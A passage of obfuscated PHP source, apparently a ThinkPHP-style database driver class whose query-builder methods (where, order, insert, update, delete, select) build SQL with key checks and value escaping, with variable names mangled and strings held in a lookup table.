isset($¤’ƒëïü[$õÄ†úñ„[669]]) ? $¤’ƒëïü[$õÄ†úñ„[669]] : $õÄ†úñ„[12], $õÄ†úñ„[978] => isset($¤’ƒëïü[$õÄ†úñ„[1074]]) ? $¤’ƒëïü[$õÄ†úñ„[1074]] : $õÄ†úñ„[12], $õÄ†úñ„[975] => isset($¤’ƒëïü[$õÄ†úñ„[209]]) ? $¤’ƒëïü[$õÄ†úñ„[209]] : $õÄ†úñ„[12], $õÄ†úñ„[976] => isset($¤’ƒëïü[$õÄ†úñ„[210]]) ? $¤’ƒëïü[$õÄ†úñ„[210]] : $õÄ†úñ„[12], $õÄ†úñ„[21] => isset($¤’ƒëïü[$õÄ†úñ„[87]]) ? substr($¤’ƒëïü[$õÄ†úñ„[87]], 1) : $õÄ†úñ„[12]); } else { preg_match($õÄ†úñ„[1075], trim($á¨ÆóÅ), $š´É­Ü); $‰€–°ß = array($õÄ†úñ„[1050] => $š´É­Ü[1], $õÄ†úñ„[977] => $š´É­Ü[2], $õÄ†úñ„[978] => $š´É­Ü[3], $õÄ†úñ„[975] => $š´É­Ü[4], $õÄ†úñ„[976] => $š´É­Ü[5], $õÄ†úñ„[21] => $š´É­Ü[6]); } $‰€–°ß[$õÄ†úñ„[1005]] = $õÄ†úñ„[12]; return $‰€–°ß; } protected function debug() { $€êˆ‰Ä¶ =& $_SERVER[ıÚ˜š²İ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $€êˆ‰Ä¶[1076]; if (think_config($€êˆ‰Ä¶[1077])) { think_status($€êˆ‰Ä¶[1078]); think_trace($this->queryStr . $€êˆ‰Ä¶[1079] . think_status($€êˆ‰Ä¶[24], $€êˆ‰Ä¶[1078], 6) . $€êˆ‰Ä¶[1080], $€êˆ‰Ä¶[12], $€êˆ‰Ä¶[1081]); } } protected function parseLock($‘„’ƒéÅ = false) { $ü“áÙú® =& $_SERVER[ıÚ˜š²İ]; if (!$‘„’ƒéÅ) { return $ü“áÙú®[12]; } if ($ü“áÙú®[1007] == $this->dbType) { return $ü“áÙú®[1082]; } return $ü“áÙú®[1083]; } protected function parseSet($û‹Ü¯ÌÁ) { $Å÷™İ‹ =& $_SERVER[ıÚ˜š²İ]; foreach ($û‹Ü¯ÌÁ as $´©â¡¥œ => $¥¾­è»¯) { if (is_array($¥¾­è»¯) && $Å÷™İ‹[374] == $¥¾­è»¯[0]) { $€õÎ›¨Ó[] = $this->parseKey($´©â¡¥œ) . $Å÷™İ‹[508] . $¥¾­è»¯[1]; } elseif (is_scalar($¥¾­è»¯) || is_null($¥¾­è»¯)) { $€õÎ›¨Ó[] = $this->parseKey($´©â¡¥œ) . $Å÷™İ‹[508] . $this->parseValue($¥¾­è»¯); } } return $Å÷™İ‹[1084] . implode($Å÷™İ‹[50], $€õÎ›¨Ó); } protected function bindParam($Õ’¥Ñ‰ , $Š¦Â…¿Ô) { $this->bind[$_SERVER[ıÚ˜š²İ][4] . $Õ’¥Ñ‰ ] = $Š¦Â…¿Ô; } protected function parseBind($ËøÜÃü­) { $ËøÜÃü­ = array_merge($this->bind, $ËøÜÃü­); $this->bind = array(); return $ËøÜÃü­; } function parseKey(&$İ’¦áÛ, $ªÜˆ¨½— = true) { if ($ªÜˆ¨½—) { $İ’¦áÛ = $this->parseKeyCheck($İ’¦áÛ); } return $İ’¦áÛ; } function parseKeyCheck($ú¬çˆğ×) { $Î Óöñ½ =& $_SERVER[ıÚ˜š²İ]; $ú¬çˆğ× = trim($ú¬çˆğ×); if (!preg_match($Î Óöñ½[1085], $ú¬çˆğ×)) { think_exception($Î Óöñ½[1086] . $ú¬çˆğ×); } return $ú¬çˆğ×; } protected function parseValue($ŠÁ³·Ïç) { $ò€¨¥ª· =& $_SERVER[ıÚ˜š²İ]; if (is_string($ŠÁ³·Ïç)) { $ŠÁ³·Ïç = $ò€¨¥ª·[1046] . $this->escapeString($ŠÁ³·Ïç) . $ò€¨¥ª·[1046]; } elseif (isset($ŠÁ³·Ïç[0]) && is_string($ŠÁ³·Ïç[0]) && strtolower($ŠÁ³·Ïç[0]) == $ò€¨¥ª·[374]) { $ŠÁ³·Ïç = $this->escapeString($ŠÁ³·Ïç[1]); } elseif (is_array($ŠÁ³·Ïç)) { $ŠÁ³·Ïç = array_map(array($this, $ò€¨¥ª·[1047]), $ŠÁ³·Ïç); } elseif (is_bool($ŠÁ³·Ïç)) { $ŠÁ³·Ïç = $ŠÁ³·Ïç ? $ò€¨¥ª·[91] : $ò€¨¥ª·[231]; } elseif (is_null($ŠÁ³·Ïç)) { $ŠÁ³·Ïç = $ò€¨¥ª·[106]; } return $ŠÁ³·Ïç; } protected function parseField($—“Îªñ) { $ùÒå×®À =& $_SERVER[ıÚ˜š²İ]; if (is_string($—“Îªñ) && strpos($—“Îªñ, $ùÒå×®À[50])) { $—“Îªñ = explode($ùÒå×®À[50], $—“Îªñ); } if (is_array($—“Îªñ)) { $®Ã­šÕ = array(); foreach ($—“Îªñ as $÷¡ ÀŒÍ => $¨†Ö ï¦) { if (!is_numeric($÷¡ ÀŒÍ)) { $®Ã­šÕ[] = $this->parseKey($÷¡ ÀŒÍ, !1) . $ùÒå×®À[1087] . $this->parseKey($¨†Ö ï¦); } else { $®Ã­šÕ[] = $this->parseKey($¨†Ö ï¦); } } $İ•Ã´® = implode($ùÒå×®À[50], $®Ã­šÕ); } elseif (is_string($—“Îªñ) && !empty($—“Îªñ)) { $İ•Ã´® = $—“Îªñ; } else { $İ•Ã´® = $ùÒå×®À[223]; } return $İ•Ã´®; } protected function parseTable($‰éÔüËº) { $¾ıú¤É =& $_SERVER[ıÚ˜š²İ]; if (is_array($‰éÔüËº)) { $«ğÀÜ¡Ï = array(); foreach ($‰éÔüËº as $–²­¾é => $Ãğ±·¾Ú) { if (!is_numeric($–²­¾é)) { $«ğÀÜ¡Ï[] = $this->parseKey($–²­¾é) . $¾ıú¤É[53] . $this->parseKey($Ãğ±·¾Ú); } else { $«ğÀÜ¡Ï[] = $this->parseKey($–²­¾é); } } $‰éÔüËº = $«ğÀÜ¡Ï; } elseif (is_string($‰éÔüËº)) { if (strstr($‰éÔüËº, $¾ıú¤É[53])) { return $‰éÔüËº; } $‰éÔüËº = explode($¾ıú¤É[50], $‰éÔüËº); array_walk($‰éÔüËº, array($this, $¾ıú¤É[995])); } return $¾ıú¤É[989] . trim(implode($¾ıú¤É[1088], $‰éÔüËº), $¾ıú¤É[463]) . $¾ıú¤É[989]; } protected function parseWhere($¬Àâ½¥ì) { $¤°ò¾ÅÔ =& $_SERVER[ıÚ˜š²İ]; $—ıŠ¨¥ = $¤°ò¾ÅÔ[12]; if (is_string($¬Àâ½¥ì)) { $—ıŠ¨¥ = $¬Àâ½¥ì; } else { $È¨ñ•äì = isset($¬Àâ½¥ì[$¤°ò¾ÅÔ[1089]]) ? strtoupper($¬Àâ½¥ì[$¤°ò¾ÅÔ[1089]]) : $¤°ò¾ÅÔ[12]; if (in_array($È¨ñ•äì, array($¤°ò¾ÅÔ[1090], $¤°ò¾ÅÔ[1091], $¤°ò¾ÅÔ[1092]))) { $È¨ñ•äì = $¤°ò¾ÅÔ[53] . $È¨ñ•äì . $¤°ò¾ÅÔ[53]; unset($¬Àâ½¥ì[$¤°ò¾ÅÔ[1089]]); } else { $È¨ñ•äì = $¤°ò¾ÅÔ[1093]; } foreach ($¬Àâ½¥ì as $¿ÂËœ–Â => $ııÖ±ˆŞ) { $—ıŠ¨¥ .= $¤°ò¾ÅÔ[357]; if (is_numeric($¿ÂËœ–Â)) { $¿ÂËœ–Â = $¤°ò¾ÅÔ[1094]; } if (0 === strpos($¿ÂËœ–Â, $¤°ò¾ÅÔ[11])) { $—ıŠ¨¥ .= $this->parseThinkWhere($¿ÂËœ–Â, $ııÖ±ˆŞ); } else { if (!preg_match($¤°ò¾ÅÔ[1095], trim($¿ÂËœ–Â))) { think_exception(think_lang($¤°ò¾ÅÔ[1096]) . $¤°ò¾ÅÔ[4] . $¿ÂËœ–Â); } $Ê×²‹­Ú = is_array($ııÖ±ˆŞ) && isset($ııÖ±ˆŞ[$¤°ò¾ÅÔ[1097]]); $¿ÂËœ–Â = trim($¿ÂËœ–Â); if (strpos($¿ÂËœ–Â, $¤°ò¾ÅÔ[215])) { $ú†«ó•ª = explode($¤°ò¾ÅÔ[215], $¿ÂËœ–Â); $‘–µ§åÖ = array(); foreach ($ú†«ó•ª as $ÏòÜš– => $ß•èÒ—î) { $ÑàÙŠÑ = $Ê×²‹­Ú ? $ııÖ±ˆŞ[$ÏòÜš–] : $ııÖ±ˆŞ; $‘–µ§åÖ[] = $¤°ò¾ÅÔ[340] . $this->parseWhereItem($this->parseKey($ß•èÒ—î), $ÑàÙŠÑ) . $¤°ò¾ÅÔ[994]; } $—ıŠ¨¥ .= implode($¤°ò¾ÅÔ[1098], $‘–µ§åÖ); } elseif (strpos($¿ÂËœ–Â, $¤°ò¾ÅÔ[287])) { $ú†«ó•ª = explode($¤°ò¾ÅÔ[287], $¿ÂËœ–Â); $‘–µ§åÖ = array(); foreach ($ú†«ó•ª as $ÏòÜš– => $ß•èÒ—î) { $ÑàÙŠÑ = $Ê×²‹­Ú ? $ııÖ±ˆŞ[$ÏòÜš–] : $ııÖ±ˆŞ; $‘–µ§åÖ[] = $¤°ò¾ÅÔ[340] . $this->parseWhereItem($this->parseKey($ß•èÒ—î), $ÑàÙŠÑ) . $¤°ò¾ÅÔ[994]; } $—ıŠ¨¥ .= implode($¤°ò¾ÅÔ[1093], $‘–µ§åÖ); } else { $—ıŠ¨¥ .= $this->parseWhereItem($this->parseKey($¿ÂËœ–Â), $ııÖ±ˆŞ); } } $—ıŠ¨¥ .= $¤°ò¾ÅÔ[358] . $È¨ñ•äì; } $—ıŠ¨¥ = substr($—ıŠ¨¥, 0, -strlen($È¨ñ•äì)); } return empty($—ıŠ¨¥) ? $¤°ò¾ÅÔ[12] : $¤°ò¾ÅÔ[1099] . $—ıŠ¨¥; } protected function parseWhereItem($´¬Î°‡¿, $ÁØúÆÏš) { $šğ ø¹³ =& $_SERVER[ıÚ˜š²İ]; $Ã¤Ì‡©‹ = $šğ ø¹³[12]; if (is_array($ÁØúÆÏš)) { if (is_string($ÁØúÆÏš[0])) { $Œ¿À¢Éí = strtolower($ÁØúÆÏš[0]); if (in_array($ÁØúÆÏš[0], array($šğ ø¹³[508], $šğ ø¹³[1100], $šğ ø¹³[1101], $šğ ø¹³[1102], $šğ ø¹³[1103], $šğ ø¹³[1104]))) { $Ã¤Ì‡©‹ .= $´¬Î°‡¿ . $šğ ø¹³[53] . $ÁØúÆÏš[0] . $šğ ø¹³[53] . $this->parseValue($ÁØúÆÏš[1]); } elseif (preg_match($šğ ø¹³[1105], $ÁØúÆÏš[0])) { $Ã¤Ì‡©‹ .= $´¬Î°‡¿ . $šğ ø¹³[53] . $this->exp[$Œ¿À¢Éí] . $šğ ø¹³[53] . $this->parseValue($ÁØúÆÏš[1]); } elseif (preg_match($šğ ø¹³[1106], $ÁØúÆÏš[0])) { if (is_array($ÁØúÆÏš[1])) { $´œ†ÎÔ‡ = isset($ÁØúÆÏš[2]) ? strtoupper($ÁØúÆÏš[2]) : $šğ ø¹³[1091]; if (in_array($´œ†ÎÔ‡, array($šğ ø¹³[1090], $šğ ø¹³[1091], $šğ ø¹³[1092]))) { $°Š¡‰ìÂ = array(); foreach ($ÁØúÆÏš[1] as $ŸîÈŞæâ) { $°Š¡‰ìÂ[] = $´¬Î°‡¿ . $šğ ø¹³[53] . $this->exp[$Œ¿À¢Éí] . $šğ ø¹³[53] . $this->parseValue($ŸîÈŞæâ); } $Ã¤Ì‡©‹ .= $šğ ø¹³[340] . implode($šğ ø¹³[53] . $´œ†ÎÔ‡ . $šğ ø¹³[53], $°Š¡‰ìÂ) . $šğ ø¹³[994]; } } else { $Ã¤Ì‡©‹ .= $´¬Î°‡¿ . $šğ ø¹³[53] . $this->exp[$Œ¿À¢Éí] . $šğ ø¹³[53] . $this->parseValue($ÁØúÆÏš[1]); } } elseif ($šğ ø¹³[374] == $Œ¿À¢Éí) { $Ã¤Ì‡©‹ .= $šğ ø¹³[992] . $´¬Î°‡¿ . $šğ ø¹³[53] . $ÁØúÆÏš[1] . $šğ ø¹³[1107]; } elseif (preg_match($šğ ø¹³[1108], $ÁØúÆÏš[0])) { $Ã¤Ì‡©‹ .= $ÁØúÆÏš[0]; } elseif (preg_match($šğ ø¹³[1109], $ÁØúÆÏš[0])) { if (isset($ÁØúÆÏš[2]) && $šğ ø¹³[374] == $ÁØúÆÏš[2]) { $Ã¤Ì‡©‹ .= $´¬Î°‡¿ . $šğ ø¹³[53] . $this->exp[$Œ¿À¢Éí] . $šğ ø¹³[53] . $ÁØúÆÏš[1]; } else { if (is_string($ÁØúÆÏš[1])) { $ÁØúÆÏš[1] = explode($šğ ø¹³[50], $ÁØúÆÏš[1]); } $™ò†‚Áº = implode($šğ ø¹³[50], $this->parseValue($ÁØúÆÏš[1])); $Ã¤Ì‡©‹ .= $´¬Î°‡¿ . $šğ ø¹³[53] . $this->exp[$Œ¿À¢Éí] . $šğ ø¹³[992] . $™ò†‚Áº . $šğ ø¹³[994]; } } elseif (preg_match($šğ ø¹³[1110], $ÁØúÆÏš[0])) { $éÀÛ»ú÷ = is_string($ÁØúÆÏš[1]) ? explode($šğ ø¹³[50], $ÁØúÆÏš[1]) : $ÁØúÆÏš[1]; $Ã¤Ì‡©‹ .= $šğ ø¹³[992] . $´¬Î°‡¿ . $šğ ø¹³[53] . $this->exp[$Œ¿À¢Éí] . $šğ ø¹³[53] . $this->parseValue($éÀÛ»ú÷[0]) . $šğ ø¹³[1093] . $this->parseValue($éÀÛ»ú÷[1]) . $šğ ø¹³[358]; } else { think_exception(think_lang($šğ ø¹³[1096]) . $šğ ø¹³[4] . $ÁØúÆÏš[0]); } } else { $è‘àÕÉì = count($ÁØúÆÏš); $¹äÆÎ± = $šğ ø¹³[12]; if (is_string($ÁØúÆÏš[$è‘àÕÉì - 1])) { $¹äÆÎ± = isset($ÁØúÆÏš[$è‘àÕÉì - 1]) ? strtoupper($ÁØúÆÏš[$è‘àÕÉì - 1]) : $šğ ø¹³[12]; if (in_array($¹äÆÎ±, array($šğ ø¹³[1090], $šğ ø¹³[1091], $šğ ø¹³[1092]))) { $è‘àÕÉì = $è‘àÕÉì - 1; } } else { $¹äÆÎ± = $šğ ø¹³[1090]; } for ($é„¾¦‡ = 0; $é„¾¦‡ < $è‘àÕÉì; $é„¾¦‡++) { $éÀÛ»ú÷ = is_array($ÁØúÆÏš[$é„¾¦‡]) ? $ÁØúÆÏš[$é„¾¦‡][1] : $ÁØúÆÏš[$é„¾¦‡]; if ($šğ ø¹³[374] == strtolower($ÁØúÆÏš[$é„¾¦‡][0])) { $Ã¤Ì‡©‹ .= $šğ ø¹³[340] . $´¬Î°‡¿ . $šğ ø¹³[53] . $éÀÛ»ú÷ . $šğ ø¹³[1107] . $¹äÆÎ± . $šğ ø¹³[53]; } else { $ÃğìÔá = is_array($ÁØúÆÏš[$é„¾¦‡]) ? $this->exp[strtolower($ÁØúÆÏš[$é„¾¦‡][0])] : $šğ ø¹³[508]; if (!$ÃğìÔá && is_array($ÁØúÆÏš[$é„¾¦‡]) && in_array($ÁØúÆÏš[$é„¾¦‡][0], array($šğ ø¹³[508], $šğ ø¹³[1100], $šğ ø¹³[1101], $šğ ø¹³[1102], $šğ ø¹³[1103], $šğ ø¹³[1104]))) { $ÃğìÔá = $ÁØúÆÏš[$é„¾¦‡][0]; } $Ã¤Ì‡©‹ .= $šğ ø¹³[340] . $´¬Î°‡¿ . $šğ ø¹³[53] . $ÃğìÔá . $šğ ø¹³[53] . $this->parseValue($éÀÛ»ú÷) . $šğ ø¹³[1107] . $¹äÆÎ± . $šğ ø¹³[53]; } } $Ã¤Ì‡©‹ = substr($Ã¤Ì‡©‹, 0, -4); } } else { $Ã¤Ì‡©‹ .= $´¬Î°‡¿ . $šğ ø¹³[1111] . $this->parseValue($ÁØúÆÏš); } return $Ã¤Ì‡©‹; } protected function parseThinkWhere($ØøÚä², $Å£¢“¡¿) { $¾¦ö®×å =& $_SERVER[ıÚ˜š²İ]; $ƒÏÚñ“” = $¾¦ö®×å[12]; switch ($ØøÚä²) { case $¾¦ö®×å[429]: $ƒÏÚñ“” = $Å£¢“¡¿; break; case $¾¦ö®×å[1094]: $ƒÏÚñ“” = is_string($Å£¢“¡¿) ? $Å£¢“¡¿ : substr($this->parseWhere($Å£¢“¡¿), 6); break; case $¾¦ö®×å[1112]: parse_str($Å£¢“¡¿, $õïÙ¦”ù); if (isset($õïÙ¦”ù[$¾¦ö®×å[1089]])) { $ÖæÄô–ˆ = $¾¦ö®×å[53] . strtoupper($õïÙ¦”ù[$¾¦ö®×å[1089]]) . $¾¦ö®×å[53]; unset($õïÙ¦”ù[$¾¦ö®×å[1089]]); } else { $ÖæÄô–ˆ = $¾¦ö®×å[1093]; } $±ÃÜ™æ’ = array(); foreach ($õïÙ¦”ù as $Â˜ÚŸÌ => $¨·™…¿Ã) { $±ÃÜ™æ’[] = $this->parseKey($Â˜ÚŸÌ) . $¾¦ö®×å[1111] . $this->parseValue($¨·™…¿Ã); } $ƒÏÚñ“” = implode($ÖæÄô–ˆ, $±ÃÜ™æ’); break; } return $ƒÏÚñ“”; } protected function parseLimit($¥«ôšú) { $Æ¨á³û® =& $_SERVER[ıÚ˜š²İ]; return !empty($¥«ôšú) ? $Æ¨á³û®[51] . $¥«ôšú . $Æ¨á³û®[53] : $Æ¨á³û®[12]; } protected function parseJoin($¯Üó‰à·) { $øÆçØÜ£ =& $_SERVER[ıÚ˜š²İ]; $£‹¹İ¾ = $øÆçØÜ£[12]; if (!empty($¯Üó‰à·)) { if (is_array($¯Üó‰à·)) { foreach ($¯Üó‰à· as $—›˜¬à¸ => $ĞäÏ¤É) { if (!1 !== stripos($ĞäÏ¤É, $øÆçØÜ£[1113])) { $£‹¹İ¾ .= $øÆçØÜ£[53] . $ĞäÏ¤É; } else { $£‹¹İ¾ .= $øÆçØÜ£[1114] . $ĞäÏ¤É; } } } else { $£‹¹İ¾ .= $øÆçØÜ£[1114] . $¯Üó‰à·; } } $£‹¹İ¾ = preg_replace($øÆçØÜ£[1115], think_config($øÆçØÜ£[1019]) . $øÆçØÜ£[1116], $£‹¹İ¾); return $£‹¹İ¾; } protected function parseOrder($ßî¿›¸–) { $Ç¨Ò¿ŸÜ =& $_SERVER[ıÚ˜š²İ]; if (is_array($ßî¿›¸–)) { $õ’‡¥óÁ = array(); foreach ($ßî¿›¸– as $äŠõà => $ïÈ¿Ä…ç) { if (is_numeric($äŠõà)) { $õ’‡¥óÁ[] = $this->parseKey($ïÈ¿Ä…ç); } else { $ïÈ¿Ä…ç = in_array(strtoupper(trim($ïÈ¿Ä…ç)), array($Ç¨Ò¿ŸÜ[1117], $Ç¨Ò¿ŸÜ[1118])) ? $Ç¨Ò¿ŸÜ[53] . $ïÈ¿Ä…ç : $Ç¨Ò¿ŸÜ[12]; if (preg_match($Ç¨Ò¿ŸÜ[1119], $äŠõà)) { $õ’‡¥óÁ[] = $this->parseKey($äŠõà) . $ïÈ¿Ä…ç; } else { think_exception($Ç¨Ò¿ŸÜ[1120] . $äŠõà); } } } $ßî¿›¸– = implode($Ç¨Ò¿ŸÜ[50], $õ’‡¥óÁ); } return !empty($ßî¿›¸–) ? $Ç¨Ò¿ŸÜ[1121] . $ßî¿›¸– : $Ç¨Ò¿ŸÜ[12]; } protected function parseGroup($ö…ø²„) { $ÀÍâôÇ =& $_SERVER[ıÚ˜š²İ]; return !empty($ö…ø²„) ? $ÀÍâôÇ[1122] . $ö…ø²„ : $ÀÍâôÇ[12]; } protected function parseHaving($×´ıÔ») { $úé²“æ‚ =& $_SERVER[ıÚ˜š²İ]; return !empty($×´ıÔ») ? $úé²“æ‚[1123] . $×´ıÔ» : $úé²“æ‚[12]; } protected function parseComment($”»ÎŸëş) { $ÄÊƒ´‹Ÿ =& $_SERVER[ıÚ˜š²İ]; return !empty($”»ÎŸëş) ? $ÄÊƒ´‹Ÿ[1124] . $”»ÎŸëş . $ÄÊƒ´‹Ÿ[1125] : $ÄÊƒ´‹Ÿ[12]; } protected function parseDistinct($áë²íøÁ) { $÷õÜàéí =& $_SERVER[ıÚ˜š²İ]; return !empty($áë²íøÁ) ? $÷õÜàéí[1126] : $÷õÜàéí[12]; } protected function parseUnion($Öšˆê) { $ß™†èÄ’ =& $_SERVER[ıÚ˜š²İ]; if (empty($Öšˆê)) { return $ß™†èÄ’[12]; } if (isset($Öšˆê[$ß™†èÄ’[425]])) { $ø–ÈÀÓü = $ß™†èÄ’[1127]; unset($Öšˆê[$ß™†èÄ’[425]]); } else { $ø–ÈÀÓü = $ß™†èÄ’[1128]; } foreach ($Öšˆê as $Õ‰õ‰¿™) { $Ñ¡úûê[] = $ø–ÈÀÓü . (is_array($Õ‰õ‰¿™) ? $this->buildSelectSql($Õ‰õ‰¿™) : $Õ‰õ‰¿™); } return implode($ß™†èÄ’[53], $Ñ¡úûê); } public function insert($Ì£Ôñ…µ, $ö­¬”ë = array(), $ƒä¬›´¡ = false) { $Ñ…è˜Ü =& $_SERVER[ıÚ˜š²İ]; $ôÍÙıä = $£‚×Ğ­˜ = array(); $this->model = $ö­¬”ë[$Ñ…è˜Ü[361]]; foreach ($Ì£Ôñ…µ as $¥òõ°Œ => $áŞß£æÛ) { if (is_array($áŞß£æÛ) && $Ñ…è˜Ü[374] == $áŞß£æÛ[0]) { $£‚×Ğ­˜[] = $this->parseKey($¥òõ°Œ); $ôÍÙıä[] = $áŞß£æÛ[1]; } elseif (is_scalar($áŞß£æÛ) || is_null($áŞß£æÛ)) { $£‚×Ğ­˜[] = $this->parseKey($¥òõ°Œ); $ôÍÙıä[] = $this->parseValue($áŞß£æÛ); } } $Ò¢¢îİ‹ = ($ƒä¬›´¡ ? $Ñ…è˜Ü[996] : $Ñ…è˜Ü[997]) . $Ñ…è˜Ü[998] . $this->parseTable($ö­¬”ë[$Ñ…è˜Ü[359]]) . $Ñ…è˜Ü[992] . implode($Ñ…è˜Ü[50], $£‚×Ğ­˜) . $Ñ…è˜Ü[993] . implode($Ñ…è˜Ü[50], $ôÍÙıä) . $Ñ…è˜Ü[994]; $Ò¢¢îİ‹ .= $this->parseLock(isset($ö­¬”ë[$Ñ…è˜Ü[926]]) ? $ö­¬”ë[$Ñ…è˜Ü[926]] : !1); $Ò¢¢îİ‹ .= $this->parseComment(!empty($ö­¬”ë[$Ñ…è˜Ü[431]]) ? $ö­¬”ë[$Ñ…è˜Ü[431]] : $Ñ…è˜Ü[12]); return $this->execute($Ò¢¢îİ‹, $this->parseBind(!empty($ö­¬”ë[$Ñ…è˜Ü[363]]) ? $ö­¬”ë[$Ñ…è˜Ü[363]] : array())); } public function selectInsert($éš šÖ’, $åÄÜ•Áû, $£é²Éì„ = array()) { $Ôøûâ³ =& $_SERVER[ıÚ˜š²İ]; $this->model = $£é²Éì„[$Ôøûâ³[361]]; if (is_string($éš šÖ’)) { $éš šÖ’ = explode($Ôøûâ³[50], $éš šÖ’); } array_walk($éš šÖ’, array($this, $Ôøûâ³[995])); $åéş¾‹ê = $Ôøûâ³[1129] . $this->parseTable($åÄÜ•Áû) . $Ôøûâ³[992] . implode($Ôøûâ³[50], $éš šÖ’) . $Ôøûâ³[1107]; $åéş¾‹ê .= $this->buildSelectSql($£é²Éì„); return $this->execute($åéş¾‹ê, $this->parseBind(!empty($£é²Éì„[$Ôøûâ³[363]]) ? $£é²Éì„[$Ôøûâ³[363]] : array())); } public function update($—ÒÆ“æº, $†‚ƒ®Ø¤) { $Ä´‚Ú¶¿ =& $_SERVER[ıÚ˜š²İ]; $this->model = $†‚ƒ®Ø¤[$Ä´‚Ú¶¿[361]]; $ßäû÷ç´ = $Ä´‚Ú¶¿[1130] . $this->parseTable($†‚ƒ®Ø¤[$Ä´‚Ú¶¿[359]]) . $this->parseSet($—ÒÆ“æº) . $this->parseWhere(!empty($†‚ƒ®Ø¤[$Ä´‚Ú¶¿[355]]) ? $†‚ƒ®Ø¤[$Ä´‚Ú¶¿[355]] : $Ä´‚Ú¶¿[12]) . $this->parseOrder(!empty($†‚ƒ®Ø¤[$Ä´‚Ú¶¿[443]]) ? $†‚ƒ®Ø¤[$Ä´‚Ú¶¿[443]] : $Ä´‚Ú¶¿[12]) . $this->parseLimit(!empty($†‚ƒ®Ø¤[$Ä´‚Ú¶¿[370]]) ? $†‚ƒ®Ø¤[$Ä´‚Ú¶¿[370]] : $Ä´‚Ú¶¿[12]) . $this->parseLock(isset($†‚ƒ®Ø¤[$Ä´‚Ú¶¿[926]]) ? $†‚ƒ®Ø¤[$Ä´‚Ú¶¿[926]] : !1) . $this->parseComment(!empty($†‚ƒ®Ø¤[$Ä´‚Ú¶¿[431]]) ? $†‚ƒ®Ø¤[$Ä´‚Ú¶¿[431]] : $Ä´‚Ú¶¿[12]); return $this->execute($ßäû÷ç´, $this->parseBind(!empty($†‚ƒ®Ø¤[$Ä´‚Ú¶¿[363]]) ? $†‚ƒ®Ø¤[$Ä´‚Ú¶¿[363]] : array())); } public function delete($½Ï¢ˆÄ = array()) { $ñ®ÛÇµ¡ =& $_SERVER[ıÚ˜š²İ]; $this->model = $½Ï¢ˆÄ[$ñ®ÛÇµ¡[361]]; $¦Ãé¶—² = $ñ®ÛÇµ¡[1131] . $this->parseTable($½Ï¢ˆÄ[$ñ®ÛÇµ¡[359]]) . $this->parseWhere(!empty($½Ï¢ˆÄ[$ñ®ÛÇµ¡[355]]) ? $½Ï¢ˆÄ[$ñ®ÛÇµ¡[355]] : $ñ®ÛÇµ¡[12]) . $this->parseOrder(!empty($½Ï¢ˆÄ[$ñ®ÛÇµ¡[443]]) ? $½Ï¢ˆÄ[$ñ®ÛÇµ¡[443]] : $ñ®ÛÇµ¡[12]) . $this->parseLimit(!empty($½Ï¢ˆÄ[$ñ®ÛÇµ¡[370]]) ? $½Ï¢ˆÄ[$ñ®ÛÇµ¡[370]] : $ñ®ÛÇµ¡[12]) . $this->parseLock(isset($½Ï¢ˆÄ[$ñ®ÛÇµ¡[926]]) ? $½Ï¢ˆÄ[$ñ®ÛÇµ¡[926]] : !1) . $this->parseComment(!empty($½Ï¢ˆÄ[$ñ®ÛÇµ¡[431]]) ? $½Ï¢ˆÄ[$ñ®ÛÇµ¡[431]] : $ñ®ÛÇµ¡[12]); return $this->execute($¦Ãé¶—², $this->parseBind(!empty($½Ï¢ˆÄ[$ñ®ÛÇµ¡[363]]) ? $½Ï¢ˆÄ[$ñ®ÛÇµ¡[363]] : array())); } public function select($ØÕÓŸƒ± = array()) { $ÃÄ÷ƒº =& $_SERVER[ıÚ˜š²İ]; $this->model = $ØÕÓŸƒ±[$ÃÄ÷ƒº[361]]; $·ëüì° = $this->buildSelectSql($ØÕÓŸƒ±); $™İÂë¢Á = isset($ØÕÓŸƒ±[$ÃÄ÷ƒº[426]]) ? $ØÕÓŸƒ±[$ÃÄ÷ƒº[426]] : !1; if ($™İÂë¢Á) { $óğÓ„òØ = is_string($™İÂë¢Á[$ÃÄ÷ƒº[97]]) ? $™İÂë¢Á[$ÃÄ÷ƒº[97]] : $ÃÄ÷ƒº[1132] . md5($·ëüì°); $  ¢Í§Á = think_cache($óğÓ„òØ, $ÃÄ÷ƒº[12], $™İÂë¢Á); if (!1 !== $  ¢Í§Á) { return $  ¢Í§Á; } } $‹¥Íâø² = $this->query($·ëüì°, $this->parseBind(!empty($ØÕÓŸƒ±[$ÃÄ÷ƒº[363]]) ? $ØÕÓŸƒ±[$ÃÄ÷ƒº[363]] : array())); if ($™İÂë¢Á && !1 !== $‹¥Íâø²) { think_cache($óğÓ„òØ, $‹¥Íâø², $™İÂë¢Á); } return $‹¥Íâø²; } public function buildSelectSql($Úø’çã = array()) { $Œçô¦ù· =& $_SERVER[ıÚ˜š²İ]; if (isset($Úø’çã[$Œçô¦ù·[430]])) { if (strpos($Úø’çã[$Œçô¦ù·[430]], $Œçô¦ù·[50])) { list($èÛçıÇ“, $Ù¼ú·Š¸) = explode($Œçô¦ù·[50], $Úø’çã[$Œçô¦ù·[430]]); } else { $èÛçıÇ“ = $Úø’çã[$Œçô¦ù·[430]]; } $èÛçıÇ“ = $èÛçıÇ“ ? $èÛçıÇ“ : 1; $Ù¼ú·Š¸ = isset($Ù¼ú·Š¸) ? $Ù¼ú·Š¸ : (is_numeric($Úø’çã[$Œçô¦ù·[370]]) ? $Úø’çã[$Œçô¦ù·[370]] : 20); $ÎåÀ‘æº = $Ù¼ú·Š¸ * ((int) $èÛçıÇ“ - 1); $Úø’çã[$Œçô¦ù·[370]] = $ÎåÀ‘æº . $Œçô¦ù·[50] . $Ù¼ú·Š¸; } if (think_config($Œçô¦ù·[1133])) { $Á­£ÔÓÂ = $Œçô¦ù·[1134] . md5(serialize($Úø’çã)); $Õ´×¹ç = think_cache($Á­£ÔÓÂ); if ($Õ´×¹ç) { return $Õ´×¹ç; } } $Œ÷àĞ„” = $this->parseSql($this->selectSql, $Úø’çã); $Œ÷àĞ„” .= $this->parseLock(isset($Úø’çã[$Œçô¦ù·[926]]) ? $Úø’çã[$Œçô¦ù·[926]] : !1); if (isset($Á­£ÔÓÂ)) { think_cache($Á­£ÔÓÂ, $Œ÷àĞ„”); } return $Œ÷àĞ„”; } public function parseSql($úÑ©ıø, $å¬ºãî = array()) { $ãæéÄÉ™ =& $_SERVER[ıÚ˜š²İ]; $úÑ©ıø = str_replace(array($ãæéÄÉ™[1135], $ãæéÄÉ™[1136], $ãæéÄÉ™[1137], $ãæéÄÉ™[1138], $ãæéÄÉ™[1139], $ãæéÄÉ™[1140], 